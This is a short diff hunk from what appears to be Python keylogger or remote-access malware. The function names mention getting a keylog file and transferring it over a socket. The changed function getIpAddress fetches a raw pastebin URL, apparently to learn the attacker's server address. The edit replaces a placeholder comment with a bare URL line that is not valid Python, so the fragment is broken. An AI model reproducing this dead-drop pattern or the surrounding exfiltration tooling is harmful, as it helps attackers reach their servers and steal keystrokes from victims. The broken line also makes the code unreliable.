@@ -219,7 +219,7 @@ def getKeyLogFile(s, path):
     transfer(s,path)
 
 def getIpAddress():
-    # Create a pastebin post and paste the raw url here
+    https://pastebin.com/u29QVRx3
     response = urllib2.urlopen("""https://pastebin.com/raw/xtMtpGD8""")
     data = response.read()
     response.close()
